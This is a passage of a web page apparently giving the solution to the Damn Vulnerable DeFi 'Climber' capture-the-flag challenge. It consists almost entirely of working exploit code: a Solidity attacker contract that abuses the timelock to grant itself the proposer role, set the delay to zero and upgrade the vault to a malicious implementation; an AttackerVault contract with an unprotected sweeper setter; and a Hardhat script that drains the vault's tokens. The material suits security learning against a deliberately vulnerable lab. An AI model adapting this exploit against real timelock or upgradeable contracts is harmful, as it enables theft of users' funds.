        <span class="n">uint256</span><span class="p">[]</span> <span class="n">memory</span> <span class="n">values</span> <span class="o">=</span> <span class="n">new</span> <span class="n">uint256</span><span class="p">[](</span><span class="mi">5</span><span class="p">);</span>

        <span class="nb">bytes</span><span class="p">[]</span> <span class="n">memory</span> <span class="n">dataElements</span> <span class="o">=</span> <span class="n">new</span> <span class="nb">bytes</span><span class="p">[](</span><span class="mi">5</span><span class="p">);</span>

        <span class="n">dataElements</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">abi</span><span class="o">.</span><span class="n">encodeWithSignature</span><span class="p">(</span>
            <span class="s2">&quot;grantRole(bytes32,address)&quot;</span><span class="p">,</span>
            <span class="n">PROPOSER_ROLE</span><span class="p">,</span>
            <span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">)</span>
        <span class="p">);</span>

        <span class="n">dataElements</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">abi</span><span class="o">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;updateDelay(uint64)&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

        <span class="n">dataElements</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">abi</span><span class="o">.</span><span class="n">encodeWithSignature</span><span class="p">(</span>
            <span class="s2">&quot;upgradeTo(address)&quot;</span><span class="p">,</span>
            <span class="n">attackerVault</span>
        <span class="p">);</span>

        <span class="n">dataElements</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">abi</span><span class="o">.</span><span class="n">encodeWithSignature</span><span class="p">(</span>
            <span class="s2">&quot;_setSweeper(address)&quot;</span><span class="p">,</span>
            <span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">)</span>
        <span class="p">);</span>

        <span class="n">dataElements</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">abi</span><span class="o">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;makeSchedule()&quot;</span><span class="p">);</span>

        <span class="nb">bytes</span> <span class="n">memory</span> <span class="n">data</span> <span class="o">=</span> <span class="n">abi</span><span class="o">.</span><span class="n">encodeWithSignature</span><span class="p">(</span>
            <span class="n">fnName</span><span class="p">,</span>
            <span class="n">targets</span><span class="p">,</span>
            <span class="n">values</span><span class="p">,</span>
            <span class="n">dataElements</span><span class="p">,</span>
            <span class="s2">&quot;&quot;</span>
        <span class="p">);</span>
        <span class="k">return</span> <span class="n">data</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">sweepFunds</span><span class="p">()</span> <span class="n">private</span> <span class="p">{</span>
        <span class="nb">bytes</span> <span class="n">memory</span> <span class="n">data</span> <span class="o">=</span> <span class="n">abi</span><span class="o">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;sweepFunds(address)&quot;</span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>

        <span class="p">(</span><span class="nb">bool</span> <span class="n">ok</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">address</span><span class="p">(</span><span class="n">vault</span><span class="p">)</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
        <span class="n">require</span><span class="p">(</span><span class="n">ok</span><span class="p">,</span> <span class="s2">&quot;call failed&quot;</span><span class="p">);</span>

        <span class="n">IERC20</span><span class="p">(</span><span class="n">token</span><span class="p">)</span><span class="o">.</span><span class="n">transfer</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">,</span> <span class="mi">10000000</span> <span class="n">ether</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>AttackerVault.sol</p>
<div class="codehilite"><pre><span></span><code><span class="o">//</span> <span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span> <span class="n">MIT</span>
<span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="s2">&quot;solady/src/utils/SafeTransferLib.sol&quot;</span><span class="p">;</span>

<span class="kn">import</span> <span class="s2">&quot;./ClimberTimelock.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="p">{</span><span class="n">WITHDRAWAL_LIMIT</span><span class="p">,</span> <span class="n">WAITING_PERIOD</span><span class="p">}</span> <span class="kn">from</span> <span class="s2">&quot;./ClimberConstants.sol&quot;</span><span class="p">;</span>
<span class="kn">import</span> <span class="p">{</span><span class="n">CallerNotSweeper</span><span class="p">,</span> <span class="n">InvalidWithdrawalAmount</span><span class="p">,</span> <span class="n">InvalidWithdrawalTime</span><span class="p">}</span> <span class="kn">from</span> <span class="s2">&quot;./ClimberErrors.sol&quot;</span><span class="p">;</span>

<span class="o">/**</span>
 <span class="o">*</span> <span class="nd">@title</span> <span class="n">ClimberVault</span>
 <span class="o">*</span> <span class="nd">@dev</span> <span class="n">To</span> <span class="n">be</span> <span class="n">deployed</span> <span class="n">behind</span> <span class="n">a</span> <span class="n">proxy</span> <span class="n">following</span> <span class="n">the</span> <span class="n">UUPS</span> <span class="n">pattern</span><span class="o">.</span> <span class="n">Upgrades</span> <span class="n">are</span> <span class="n">to</span> <span class="n">be</span> <span class="n">triggered</span> <span class="n">by</span> <span class="n">the</span> <span class="n">owner</span><span class="o">.</span>
 <span class="o">*</span> <span class="nd">@author</span> <span class="n">Damn</span> <span class="n">Vulnerable</span> <span class="n">DeFi</span> <span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">damnvulnerabledefi</span><span class="o">.</span><span class="n">xyz</span><span class="p">)</span>
 <span class="o">*/</span>
<span class="n">contract</span> <span class="n">AttackerVault</span> <span class="ow">is</span> <span class="n">Initializable</span><span class="p">,</span> <span class="n">OwnableUpgradeable</span><span class="p">,</span> <span class="n">UUPSUpgradeable</span> <span class="p">{</span>
    <span class="n">uint256</span> <span class="n">private</span> <span class="n">_lastWithdrawalTimestamp</span><span class="p">;</span>
    <span class="n">address</span> <span class="n">private</span> <span class="n">_sweeper</span><span class="p">;</span>

    <span class="n">modifier</span> <span class="n">onlySweeper</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span> <span class="o">!=</span> <span class="n">_sweeper</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">CallerNotSweeper</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="n">_</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">///</span> <span class="nd">@custom</span><span class="p">:</span><span class="n">oz</span><span class="o">-</span><span class="n">upgrades</span><span class="o">-</span><span class="n">unsafe</span><span class="o">-</span><span class="n">allow</span> <span class="n">constructor</span>
    <span class="n">constructor</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">_disableInitializers</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">initialize</span><span class="p">(</span><span class="n">address</span> <span class="n">admin</span><span class="p">,</span> <span class="n">address</span> <span class="n">proposer</span><span class="p">,</span> <span class="n">address</span> <span class="n">sweeper</span><span class="p">)</span> <span class="n">external</span> <span class="n">initializer</span> <span class="p">{</span>
        <span class="o">//</span> <span class="n">Initialize</span> <span class="n">inheritance</span> <span class="n">chain</span>
        <span class="n">__Ownable_init</span><span class="p">();</span>
        <span class="n">__UUPSUpgradeable_init</span><span class="p">();</span>

        <span class="o">//</span> <span class="n">Deploy</span> <span class="n">timelock</span> <span class="ow">and</span> <span class="n">transfer</span> <span class="n">ownership</span> <span class="n">to</span> <span class="n">it</span>
        <span class="n">transferOwnership</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">new</span> <span class="n">ClimberTimelock</span><span class="p">(</span><span class="n">admin</span><span class="p">,</span> <span class="n">proposer</span><span class="p">)));</span>

        <span class="n">_setSweeper</span><span class="p">(</span><span class="n">sweeper</span><span class="p">);</span>
        <span class="n">_updateLastWithdrawalTimestamp</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">timestamp</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="o">//</span> <span class="n">Allows</span> <span class="n">the</span> <span class="n">owner</span> <span class="n">to</span> <span class="n">send</span> <span class="n">a</span> <span class="n">limited</span> <span class="n">amount</span> <span class="n">of</span> <span class="n">tokens</span> <span class="n">to</span> <span class="n">a</span> <span class="n">recipient</span> <span class="n">every</span> <span class="n">now</span> <span class="ow">and</span> <span class="n">then</span>
    <span class="n">function</span> <span class="n">withdraw</span><span class="p">(</span><span class="n">address</span> <span class="n">token</span><span class="p">,</span> <span class="n">address</span> <span class="n">recipient</span><span class="p">,</span> <span class="n">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="n">external</span> <span class="n">onlyOwner</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">amount</span> <span class="o">&gt;</span> <span class="n">WITHDRAWAL_LIMIT</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">InvalidWithdrawalAmount</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">timestamp</span> <span class="o">&lt;=</span> <span class="n">_lastWithdrawalTimestamp</span> <span class="o">+</span> <span class="n">WAITING_PERIOD</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">revert</span> <span class="n">InvalidWithdrawalTime</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="n">_updateLastWithdrawalTimestamp</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">timestamp</span><span class="p">);</span>

        <span class="n">SafeTransferLib</span><span class="o">.</span><span class="n">safeTransfer</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">recipient</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="o">//</span> <span class="n">Allows</span> <span class="n">trusted</span> <span class="n">sweeper</span> <span class="n">account</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="nb">any</span> <span class="n">tokens</span>
    <span class="n">function</span> <span class="n">sweepFunds</span><span class="p">(</span><span class="n">address</span> <span class="n">token</span><span class="p">)</span> <span class="n">external</span> <span class="n">onlySweeper</span> <span class="p">{</span>
        <span class="n">SafeTransferLib</span><span class="o">.</span><span class="n">safeTransfer</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">_sweeper</span><span class="p">,</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">token</span><span class="p">)</span><span class="o">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">)));</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">getSweeper</span><span class="p">()</span> <span class="n">external</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="n">address</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">_sweeper</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">_setSweeper</span><span class="p">(</span><span class="n">address</span> <span class="n">newSweeper</span><span class="p">)</span> <span class="n">public</span> <span class="p">{</span>
        <span class="n">_sweeper</span> <span class="o">=</span> <span class="n">newSweeper</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">getLastWithdrawalTimestamp</span><span class="p">()</span> <span class="n">external</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="n">uint256</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">_lastWithdrawalTimestamp</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">_updateLastWithdrawalTimestamp</span><span class="p">(</span><span class="n">uint256</span> <span class="n">timestamp</span><span class="p">)</span> <span class="n">private</span> <span class="p">{</span>
        <span class="n">_lastWithdrawalTimestamp</span> <span class="o">=</span> <span class="n">timestamp</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">//</span> <span class="n">By</span> <span class="n">marking</span> <span class="n">this</span> <span class="n">internal</span> <span class="n">function</span> <span class="k">with</span> <span class="err">`</span><span class="n">onlyOwner</span><span class="err">`</span><span class="p">,</span> <span class="n">we</span> <span class="n">only</span> <span class="n">allow</span> <span class="n">the</span> <span class="n">owner</span> <span class="n">account</span> <span class="n">to</span> <span class="n">authorize</span> <span class="n">an</span> <span class="n">upgrade</span>
    <span class="n">function</span> <span class="n">_authorizeUpgrade</span><span class="p">(</span><span class="n">address</span> <span class="n">newImplementation</span><span class="p">)</span> <span class="n">internal</span> <span class="n">override</span> <span class="n">onlyOwner</span> <span class="p">{}</span>
<span class="p">}</span>
</code></pre></div>

<h2 id="solution-code">Solution code</h2>
<div class="codehilite"><pre><span></span><code><span class="n">const</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="n">ethers</span><span class="p">,</span><span class="w"> </span><span class="n">upgrades</span><span class="w"> </span><span class="err">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="s1">&#39;hardhat&#39;</span><span class="p">);</span>
<span class="n">const</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="n">expect</span><span class="w"> </span><span class="err">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="s1">&#39;chai&#39;</span><span class="p">);</span>
<span class="n">const</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="n">setBalance</span><span class="w"> </span><span class="err">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="s1">&#39;@nomicfoundation/hardhat-network-helpers&#39;</span><span class="p">);</span>

<span class="k">describe</span><span class="p">(</span><span class="s1">&#39;[Challenge] Climber&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
<span class="w">    </span><span class="n">let</span><span class="w"> </span><span class="n">deployer</span><span class="p">,</span><span class="w"> </span><span class="n">proposer</span><span class="p">,</span><span class="w"> </span><span class="n">sweeper</span><span class="p">,</span><span class="w"> </span><span class="n">player</span><span class="p">;</span>
<span class="w">    </span><span class="n">let</span><span class="w"> </span><span class="n">timelock</span><span class="p">,</span><span class="w"> </span><span class="n">vault</span><span class="p">,</span><span class="w"> </span><span class="n">token</span><span class="p">;</span>

<span class="w">    </span><span class="n">const</span><span class="w"> </span><span class="n">VAULT_TOKEN_BALANCE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">10000000</span><span class="n">n</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">10</span><span class="n">n</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mi">18</span><span class="n">n</span><span class="p">;</span>
<span class="w">    </span><span class="n">const</span><span class="w"> </span><span class="n">PLAYER_INITIAL_ETH_BALANCE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="n">n</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">10</span><span class="n">n</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mi">17</span><span class="n">n</span><span class="p">;</span>
<span class="w">    </span><span class="n">const</span><span class="w"> </span><span class="n">TIMELOCK_DELAY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">60</span><span class="p">;</span>

<span class="w">    </span><span class="k">before</span><span class="p">(</span><span class="n">async</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="cm">/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */</span>
<span class="w">        </span><span class="o">[</span><span class="n">deployer, proposer, sweeper, player</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getSigners</span><span class="p">();</span>

<span class="w">        </span><span class="n">await</span><span class="w"> </span><span class="n">setBalance</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">address</span><span class="p">,</span><span class="w"> </span><span class="n">PLAYER_INITIAL_ETH_BALANCE</span><span class="p">);</span>
<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">provider</span><span class="p">.</span><span class="n">getBalance</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">address</span><span class="p">)).</span><span class="k">to</span><span class="p">.</span><span class="n">equal</span><span class="p">(</span><span class="n">PLAYER_INITIAL_ETH_BALANCE</span><span class="p">);</span>

<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Deploy</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">vault</span><span class="w"> </span><span class="n">behind</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="k">using</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">UUPS</span><span class="w"> </span><span class="n">pattern</span><span class="p">,</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">passing</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">necessary</span><span class="w"> </span><span class="n">addresses</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="err">`</span><span class="nl">ClimberVault</span><span class="p">:</span><span class="err">:</span><span class="k">initialize</span><span class="p">(</span><span class="n">address</span><span class="p">,</span><span class="n">address</span><span class="p">,</span><span class="n">address</span><span class="p">)</span><span class="err">`</span><span class="w"> </span><span class="k">function</span>
<span class="w">        </span><span class="n">vault</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">upgrades</span><span class="p">.</span><span class="n">deployProxy</span><span class="p">(</span>
<span class="w">            </span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;ClimberVault&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">deployer</span><span class="p">),</span>
<span class="w">            </span><span class="o">[</span><span class="n"> deployer.address, proposer.address, sweeper.address </span><span class="o">]</span><span class="p">,</span>
<span class="w">            </span><span class="err">{</span><span class="w"> </span><span class="nl">kind</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;uups&#39;</span><span class="w"> </span><span class="err">}</span>
<span class="w">        </span><span class="p">);</span>

<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">vault</span><span class="p">.</span><span class="n">getSweeper</span><span class="p">()).</span><span class="k">to</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="n">sweeper</span><span class="p">.</span><span class="n">address</span><span class="p">);</span>
<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">vault</span><span class="p">.</span><span class="n">getLastWithdrawalTimestamp</span><span class="p">()).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">gt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">vault</span><span class="p">.</span><span class="n">owner</span><span class="p">()).</span><span class="k">to</span><span class="p">.</span><span class="ow">not</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="n">ethers</span><span class="p">.</span><span class="n">constants</span><span class="p">.</span><span class="n">AddressZero</span><span class="p">);</span>
<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">vault</span><span class="p">.</span><span class="n">owner</span><span class="p">()).</span><span class="k">to</span><span class="p">.</span><span class="ow">not</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="n">deployer</span><span class="p">.</span><span class="n">address</span><span class="p">);</span>

<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Instantiate</span><span class="w"> </span><span class="n">timelock</span>
<span class="w">        </span><span class="n">let</span><span class="w"> </span><span class="n">timelockAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">vault</span><span class="p">.</span><span class="n">owner</span><span class="p">();</span>
<span class="w">        </span><span class="n">timelock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="p">(</span>
<span class="w">            </span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;ClimberTimelock&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">deployer</span><span class="p">)</span>
<span class="w">        </span><span class="p">).</span><span class="n">attach</span><span class="p">(</span><span class="n">timelockAddress</span><span class="p">);</span>

<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Ensure</span><span class="w"> </span><span class="n">timelock</span><span class="w"> </span><span class="n">delay</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">correct</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">changed</span>
<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">timelock</span><span class="p">.</span><span class="n">delay</span><span class="p">()).</span><span class="k">to</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="n">TIMELOCK_DELAY</span><span class="p">);</span>
<span class="w">        </span><span class="n">await</span><span class="w"> </span><span class="n">expect</span><span class="p">(</span><span class="n">timelock</span><span class="p">.</span><span class="n">updateDelay</span><span class="p">(</span><span class="n">TIMELOCK_DELAY</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="n">revertedWithCustomError</span><span class="p">(</span><span class="n">timelock</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;CallerNotTimelock&#39;</span><span class="p">);</span>

<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Ensure</span><span class="w"> </span><span class="n">timelock</span><span class="w"> </span><span class="n">roles</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">correctly</span><span class="w"> </span><span class="n">initialized</span>
<span class="w">        </span><span class="n">expect</span><span class="p">(</span>
<span class="w">            </span><span class="n">await</span><span class="w"> </span><span class="n">timelock</span><span class="p">.</span><span class="n">hasRole</span><span class="p">(</span><span class="n">ethers</span><span class="p">.</span><span class="n">utils</span><span class="p">.</span><span class="n">id</span><span class="p">(</span><span class="ss">&quot;PROPOSER_ROLE&quot;</span><span class="p">),</span><span class="w"> </span><span class="n">proposer</span><span class="p">.</span><span class="n">address</span><span class="p">)</span>
<span class="w">        </span><span class="p">).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="k">true</span><span class="p">;</span>
<span class="w">        </span><span class="n">expect</span><span class="p">(</span>
<span class="w">            </span><span class="n">await</span><span class="w"> </span><span class="n">timelock</span><span class="p">.</span><span class="n">hasRole</span><span class="p">(</span><span class="n">ethers</span><span class="p">.</span><span class="n">utils</span><span class="p">.</span><span class="n">id</span><span class="p">(</span><span class="ss">&quot;ADMIN_ROLE&quot;</span><span class="p">),</span><span class="w"> </span><span class="n">deployer</span><span class="p">.</span><span class="n">address</span><span class="p">)</span>
<span class="w">        </span><span class="p">).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="k">true</span><span class="p">;</span>
<span class="w">        </span><span class="n">expect</span><span class="p">(</span>
<span class="w">            </span><span class="n">await</span><span class="w"> </span><span class="n">timelock</span><span class="p">.</span><span class="n">hasRole</span><span class="p">(</span><span class="n">ethers</span><span class="p">.</span><span class="n">utils</span><span class="p">.</span><span class="n">id</span><span class="p">(</span><span class="ss">&quot;ADMIN_ROLE&quot;</span><span class="p">),</span><span class="w"> </span><span class="n">timelock</span><span class="p">.</span><span class="n">address</span><span class="p">)</span>
<span class="w">        </span><span class="p">).</span><span class="k">to</span><span class="p">.</span><span class="n">be</span><span class="p">.</span><span class="k">true</span><span class="p">;</span>

<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Deploy</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">transfer</span><span class="w"> </span><span class="n">initial</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">vault</span>
<span class="w">        </span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;DamnValuableToken&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">deployer</span><span class="p">)).</span><span class="n">deploy</span><span class="p">();</span>
<span class="w">        </span><span class="n">await</span><span class="w"> </span><span class="n">token</span><span class="p">.</span><span class="n">transfer</span><span class="p">(</span><span class="n">vault</span><span class="p">.</span><span class="n">address</span><span class="p">,</span><span class="w"> </span><span class="n">VAULT_TOKEN_BALANCE</span><span class="p">);</span>
<span class="w">    </span><span class="err">}</span><span class="p">);</span>

<span class="w">    </span><span class="n">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">async</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="cm">/** CODE YOUR SOLUTION HERE */</span>
<span class="w">        </span><span class="n">attackerVault</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;AttackerVault&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">player</span><span class="p">)).</span><span class="n">deploy</span><span class="p">();</span>

<span class="w">        </span><span class="n">climberAttacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;ClimberAttacker&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">player</span><span class="p">)).</span><span class="n">deploy</span><span class="p">(</span>
<span class="w">            </span><span class="n">timelock</span><span class="p">.</span><span class="n">address</span><span class="p">,</span>
<span class="w">            </span><span class="n">vault</span><span class="p">.</span><span class="n">address</span><span class="p">,</span>
<span class="w">            </span><span class="n">attackerVault</span><span class="p">.</span><span class="n">address</span><span class="p">,</span>
<span class="w">            </span><span class="n">token</span><span class="p">.</span><span class="n">address</span>
<span class="w">        </span><span class="p">);</span>

<span class="w">        </span><span class="n">await</span><span class="w"> </span><span class="n">climberAttacker</span><span class="p">.</span><span class="k">connect</span><span class="p">(</span><span class="n">player</span><span class="p">).</span><span class="n">attack</span><span class="p">();</span>
<span class="w">    </span><span class="err">}</span><span class="p">);</span>

<span class="w">    </span><span class="k">after</span><span class="p">(</span><span class="n">async</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="cm">/** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */</span>
<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">token</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">vault</span><span class="p">.</span><span class="n">address</span><span class="p">)).</span><span class="k">to</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">token</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">address</span><span class="p">)).</span><span class="k">to</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="n">VAULT_TOKEN_BALANCE</span><span class="p">);</span>
<span class="w">    </span><span class="err">}</span><span class="p">);</span>
<span class="err">}</span><span class="p">);</span>
</code></pre></div>





                
              </article>
            </div>
          
          
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
